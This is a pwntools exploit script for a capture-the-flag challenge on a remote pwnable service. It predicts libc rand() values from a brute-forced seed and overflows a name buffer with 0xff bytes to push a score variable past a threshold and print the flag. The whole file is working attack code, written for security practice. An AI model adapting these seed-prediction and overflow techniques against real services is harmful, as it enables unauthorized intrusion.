# WARNING: this is really unreliable, and in remote
# can take more than 20 minutes to flag

from pwn import *

from ctypes import CDLL
from ctypes.util import find_library

from concurrent.futures import *
from threading import *

exe = ELF("./challenge_patched", checksec=True)

context.binary = exe
context.arch = "amd64"

HOST = "svc.pwnable.xyz"
PORT = 30024

gdbscript = """
set follow-fork-mode chil
b *main+0x59
"""

MAX_WORKERS = 8

# args.LOCAL = True
# args.DEBUG = True

def conn():
    if args.LOCAL:
        return process(exe.path)
    
    return remote(HOST, PORT)

def check_seed(stop):
    libc = CDLL(find_library("c"))
    
    while not stop.is_set():
        libc.srand(1)

        r = conn()
        
        r.sendlineafter(b"[Y/n] :", b"y")
        r.sendafter(b"Name: ", b"a" * 44)
        r.sendlineafter(b"> ", b"2")
        r.sendlineafter(b"pawa> ", str(libc.rand()).encode())
        
        if b"draw" in r.recvline():
            stop.set()
            return r
        
        r.close()

    return None

def bruteforce_seed():
    stop = Event()

    pool = ThreadPoolExecutor(max_workers=MAX_WORKERS)
    futures = [
        pool.submit(check_seed, stop)
        for _ in range(MAX_WORKERS)
    ]

    for future in as_completed(futures):
        result = future.result()

        if result is not None:
            stop.set()
            pool.shutdown()
            return result

    return None

START = 44
SCORE = 0

def maximize_score(r, libc):
    r.sendafter(b"[N/y]", b"y")
    r.sendafter(b"Name: ", b"\xff" * START)

    global SCORE
    r.sendlineafter(b"pawa> ", str(libc.rand()).encode())
    r.sendafter(b"[N/y]", b"y")
    
    idx = pack(SCORE).find(b"\x00")
    r.sendafter(b"Name: ", b"\xff" * (START + idx))
    
    SCORE = int.from_bytes(b"\xff" * idx + pack(SCORE)[idx:], "little")

    r.sendlineafter(b"pawa> ", str(libc.rand() + 1).encode())
    SCORE += 1
    
    while SCORE < 0x0101010101010101:
        idx = pack(SCORE).find(b"\x00")

        payload = str(libc.rand()).encode() + b"\ny" + b"\xff" * (START + idx)
        r.sendlineafter(b"pawa> ", payload)
        
        SCORE = int.from_bytes(b"\xff" * idx + pack(SCORE)[idx:], "little") + 1
        r.sendlineafter(b"pawa> ", str(libc.rand() + 1).encode())

def print_flag(r, libc):
    r.sendlineafter(b"pawa> ", str(libc.rand() - 1).encode())
    
def main():
    r = bruteforce_seed()
    print("FOUND")
    
    if args.LOCAL and args.DEBUG:
        gdb.attach(r, gdbscript=gdbscript)
        input()

    libc = CDLL(find_library("c"))
    libc.srand(1)
    libc.rand()

    maximize_score(r, libc)
    print_flag(r, libc)
    
    r.interactive()

if __name__ == "__main__":
    main()
